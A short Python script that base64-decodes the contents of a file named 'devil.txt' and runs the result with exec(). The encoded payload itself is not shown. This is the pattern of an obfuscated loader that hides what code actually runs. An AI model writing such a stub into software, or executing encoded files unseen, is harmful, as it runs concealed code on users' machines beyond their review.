import base64

# Read the encoded file in binary mode
with open("devil.txt", "rb") as encoded_file:
    encoded_content = encoded_file.read()

# Decode the content
decoded_content = base64.b64decode(encoded_content)

# Convert the decoded content to a string (and strip any null bytes if necessary)
decoded_script = decoded_content.decode('utf-8', errors='ignore').replace('\x00', '')

# Run the decoded script using exec
exec(decoded_script)